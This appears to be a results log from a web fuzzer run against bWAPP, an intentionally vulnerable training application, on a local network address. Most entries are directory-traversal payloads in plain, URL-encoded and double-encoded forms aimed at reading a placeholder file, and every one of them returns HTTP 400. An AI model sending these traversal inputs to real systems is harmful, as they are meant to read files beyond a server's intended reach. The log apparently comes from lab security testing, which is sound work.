1,302,0L,0W,http://192.168.1.86/bWAPP/
2,302,0L,0W,http://192.168.1.86/bWAPP/
3,302,0L,0W,http://192.168.1.86/bWAPP/
7,302,0L,0W,http://192.168.1.86/bWAPP/
8,302,0L,0W,http://192.168.1.86/bWAPP/
4,302,0L,0W,http://192.168.1.86/bWAPP/
5,302,0L,0W,http://192.168.1.86/bWAPP/
6,302,0L,0W,http://192.168.1.86/bWAPP/
11,400,10L,42W,http://192.168.1.86/bWAPP/../../../{FILE}
10,400,10L,42W,http://192.168.1.86/bWAPP/../../{FILE}
12,400,10L,42W,http://192.168.1.86/bWAPP/../../../../{FILE}
27,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/{FILE}
30,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
28,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
29,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
31,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
32,400,10L,42W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
216,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66{FILE}
218,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66{FILE}
219,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
222,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
220,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
217,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66{FILE}
221,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
223,400,10L,42W,http://192.168.1.86/bWAPP/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
238,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
235,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
228,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
229,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
230,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
227,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
225,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/{FILE}
226,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
233,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
232,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66{FILE}
241,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63{FILE}
240,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63{FILE}
234,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
244,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
239,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
236,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
245,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
242,400,10L,42W,http://192.168.1.86/bWAPP/..%%35%63..%%35%63..%%35%63{FILE}
237,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
248,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/{FILE}
255,400,10L,42W,http://192.168.1.86/bWAPP/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
